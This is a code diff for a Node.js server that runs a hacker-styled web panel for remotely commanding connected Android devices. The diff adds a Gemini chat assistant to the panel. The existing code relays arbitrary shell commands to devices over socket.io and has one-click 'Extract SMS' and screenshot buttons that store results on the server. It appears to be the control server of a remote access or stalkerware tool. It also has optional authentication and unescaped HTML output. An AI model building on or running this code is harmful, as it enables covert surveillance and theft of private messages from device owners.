@@ -1,4 +1,4 @@
-// index.js - Advanced Server (Real Data Handler + Smart Scroll)
+// index.js - Advanced Server with AI Assistant + Real Data Handler + Smart Scroll
 require('dotenv').config();
 const express = require('express');
 const http = require('http');
@@ -27,11 +27,16 @@ app.use(cors());
 app.use(express.json({ limit: '500mb' }));
 app.use(express.urlencoded({ limit: '500mb', extended: true }));
 
-const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY || '');
+// --- AI Setup ---
+let genAI = null;
+if (process.env.GEMINI_API_KEY) {
+    genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
+}
+
 const connectedDevices = new Map(); 
 const pendingCommands = new Map(); 
 
-// Authentication
+// Authentication Middleware
 const authMiddleware = (req, res, next) => {
     const token = req.headers['authorization'] || req.query.token;
     if (process.env.AUTH_TOKEN && token !== process.env.AUTH_TOKEN) {
@@ -40,17 +45,17 @@ const authMiddleware = (req, res, next) => {
     next();
 };
 
-// ==================== FRONTEND UI (WEB) ====================
+// ==================== FRONTEND UI (ENHANCED MOBILE-FRIENDLY) ====================
 const webUIHTML = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Core OS Terminal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #004400; }
+        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #004400; --ai: #ffaa00; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
@@ -70,26 +75,27 @@ const webUIHTML = `
         .btn-danger { background: #300; border-color: #ff3333; color: #ff3333; }
         .flex-1 { flex: 1; min-width: 120px; }
 
-        /* SCROLLING TERMINAL CSS */
         #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); border-radius: 4px; padding: 15px; overflow-y: auto; overflow-x: hidden; font-size: 13px; white-space: pre-wrap; word-wrap: break-word; margin-bottom: 10px; line-height: 1.5; scroll-behavior: smooth; }
         
-        /* Input Area */
         .input-area { display: flex; background: var(--panel); border: 1px solid var(--neon); border-radius: 4px; }
         .prompt { color: #fff; font-weight: bold; padding: 12px; border-right: 1px solid var(--border); }
         #cmdInput { border: none; background: transparent; flex-grow: 1; padding: 12px; color: var(--neon); width: 100%; }
 
-        /* File Manager */
         .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid var(--border); background: var(--panel); border-radius: 4px; }
         .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid var(--border); }
         .file-info { display: flex; align-items: center; gap: 12px; word-break: break-all; }
         .file-actions { display: flex; gap: 8px; }
 
-        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; margin-top: 10px;} .log-ai { color: #ffff55; } .log-data { color: #ccc; }
+        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; margin-top: 10px;} .log-ai { color: var(--ai); font-style: italic; } .log-data { color: #ccc; }
         
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: var(--bg); }
         ::-webkit-scrollbar-thumb { background: var(--neon); }
 
+        /* AI Section in Home Tab */
+        .ai-card { background: #1a1a00; border: 1px solid var(--ai); border-radius: 8px; padding: 15px; margin-top: 20px; }
+        .ai-response { background: #000; padding: 10px; border-radius: 4px; margin-top: 10px; min-height: 60px; max-height: 200px; overflow-y: auto; color: #ccc; }
+        
         @media (max-width: 600px) {
             nav button { font-size: 13px; padding: 12px 5px; }
             .prompt { padding: 12px 5px; font-size: 12px; }
@@ -116,13 +122,26 @@ const webUIHTML = `
         </div>
 
         <div id="tab-home" class="tab-content active">
-            <div style="text-align:center; margin-top:30px;">
+            <div style="text-align:center; margin-top:10px;">
                 <h1 style="font-size: 2rem; text-shadow: 0 0 10px var(--neon);">SYSTEM ACTIVE</h1>
-                <p style="color: #666; margin-top: 10px;">Select a device and go to Terminal.</p>
-                <div style="margin-top: 30px; display: grid; gap: 10px; max-width: 300px; margin-left: auto; margin-right: auto;">
+                <p style="color: #666; margin-top: 5px;">Select a device and go to Terminal.</p>
+                <div style="margin-top: 20px; display: grid; gap: 10px; max-width: 300px; margin-left: auto; margin-right: auto;">
                     <button class="btn" onclick="quickCmd('ls')">List Files (ls)</button>
                     <button class="btn" onclick="quickCmd('sms > sms.txt')">Extract SMS</button>
                     <button class="btn" onclick="quickCmd('screenshot > screen.png')">Take Screenshot</button>
+                </div>
+                
+                <!-- AI Assistant Card -->
+                <div class="ai-card">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                        <i class="fas fa-robot" style="color: var(--ai); font-size: 24px;"></i>
+                        <span style="font-weight: bold; color: var(--ai);">Gemini AI Assistant</span>
+                    </div>
+                    <div style="display: flex; gap: 5px;">
+                        <input type="text" id="aiPrompt" placeholder="Ask me anything..." style="flex: 1;">
+                        <button class="btn" onclick="askAI()" style="background: #332200;"><i class="fas fa-paper-plane"></i></button>
+                    </div>
+                    <div id="aiResponse" class="ai-response">Click ask to get AI help.</div>
                 </div>
             </div>
         </div>
@@ -174,12 +193,10 @@ const webUIHTML = `
             processInput();
         }
 
-        // PERFECT SCROLLING FUNCTION
         function log(msg, type = 'normal') {
             const div = document.createElement('div');
             div.className = 'log-' + type;
             
-            // Format object nicely if it's JSON, else replace newlines
             if (typeof msg === 'object') {
                 div.textContent = JSON.stringify(msg, null, 2);
             } else {
@@ -187,11 +204,7 @@ const webUIHTML = `
             }
             
             term.appendChild(div);
-
-            // Force scroll to bottom perfectly
-            setTimeout(() => {
-                term.scrollTop = term.scrollHeight;
-            }, 50);
+            setTimeout(() => { term.scrollTop = term.scrollHeight; }, 50);
         }
 
         async function fetchAPI(endpoint, options = {}) {
@@ -241,22 +254,40 @@ const webUIHTML = `
                 
                 let rawResult = data.result;
 
-                // 1. PEHLE TERMINAL ME PRINT KAREGA
                 if (typeof rawResult === 'string' && rawResult.length > 50000 && saveAs) {
-                    // Agar image base64 hai ya bohot bada data hai, toh terminal freeze na ho isliye chota dikhayega
                     log('[Data Received: ' + rawResult.length + ' bytes... Printing preview]', 'data');
                     log(rawResult.substring(0, 500) + '... [TRUNCATED]', 'data');
                 } else {
-                    // Normal text data (ls, sms, etc) ko poora print karega
                     log(rawResult || '[No Output Received from App]', 'data');
                 }
 
-                // 2. PHIR SAVE KA SUCCESS MESSAGE DEGA
                 if(data.savedToFile) {
                     log(\`[✔] File Saved Successfully: \${saveAs} (Check File Manager)\`, 'success');
                 }
 
             } catch (err) { log('[!] Error: ' + err.message, 'error'); }
+        }
+
+        // --- AI Assistant ---
+        async function askAI() {
+            const promptInput = document.getElementById('aiPrompt');
+            const prompt = promptInput.value.trim();
+            if (!prompt) return;
+            promptInput.value = '';
+            
+            const responseDiv = document.getElementById('aiResponse');
+            responseDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Thinking...';
+            
+            try {
+                const data = await fetchAPI('/api/ai/assist', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ prompt, deviceId: deviceSelect.value || undefined })
+                });
+                responseDiv.innerHTML = data.response.replace(/\\n/g, '<br>');
+            } catch (err) {
+                responseDiv.innerHTML = '<span style="color:red">Error: ' + err.message + '</span>';
+            }
         }
 
         // --- FILE MANAGER ---
@@ -305,6 +336,26 @@ const webUIHTML = `
 
 app.get('/', (req, res) => res.send(webUIHTML));
 
+// ==================== AI ASSISTANT ROUTE ====================
+app.post('/api/ai/assist', authMiddleware, async (req, res) => {
+    try {
+        if (!genAI) return res.status(503).json({ success: false, error: 'AI not configured. Set GEMINI_API_KEY.' });
+        const { prompt, deviceId } = req.body;
+        const model = genAI.getGenerativeModel({ model: 'gemini-2.0-flash-exp' });
+        
+        let context = "You are an assistant for remote Android device management. Provide concise, actionable help. ";
+        if (deviceId) context += `The user is currently managing device: ${deviceId}. `;
+        
+        const result = await model.generateContent(context + prompt);
+        const response = await result.response;
+        const text = response.text();
+        res.json({ success: true, response: text });
+    } catch (error) {
+        console.error('AI Error:', error);
+        res.status(500).json({ success: false, error: 'AI service failed' });
+    }
+});
+
 // ==================== REST API ====================
 
 app.get('/api/devices', authMiddleware, (req, res) => {
@@ -336,7 +387,7 @@ app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
 
     try {
         device.socket.emit('execute_command', { requestId, command });
-        let result = await commandPromise; // This is the REAL DATA coming from your Android app
+        let result = await commandPromise;
 
         // Save logic
         if (saveAs) {
@@ -398,6 +449,7 @@ io.on('connection', (socket) => {
         connectedDevices.set(deviceId, { socket, deviceInfo });
         socket.join('device:' + deviceId);
         socket.emit('registered', { success: true });
+        console.log(`📱 Device Registered: ${deviceId} (${deviceInfo?.model || 'Unknown'})`);
     });
 
     socket.on('command_response', (data) => {
@@ -412,11 +464,21 @@ io.on('connection', (socket) => {
     });
 
     socket.on('disconnect', () => {
-        if (socket.deviceId) connectedDevices.delete(socket.deviceId);
+        if (socket.deviceId) {
+            connectedDevices.delete(socket.deviceId);
+            console.log(`🔌 Device Disconnected: ${socket.deviceId}`);
+        }
     });
 });
 
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log("🚀 Server Live on Port " + PORT);
+    console.log(`
+╔════════════════════════════════════════════════════════╗
+║   🚀 Remote Android Server Live on Port ${PORT}        ║
+╠════════════════════════════════════════════════════════╣
+║   AI Assistant: ${genAI ? 'Enabled' : 'Disabled (Set GEMINI_API_KEY)'}      ║
+║   File Storage: ./file_manager_data/                   ║
+╚════════════════════════════════════════════════════════╝
+    `);
 });
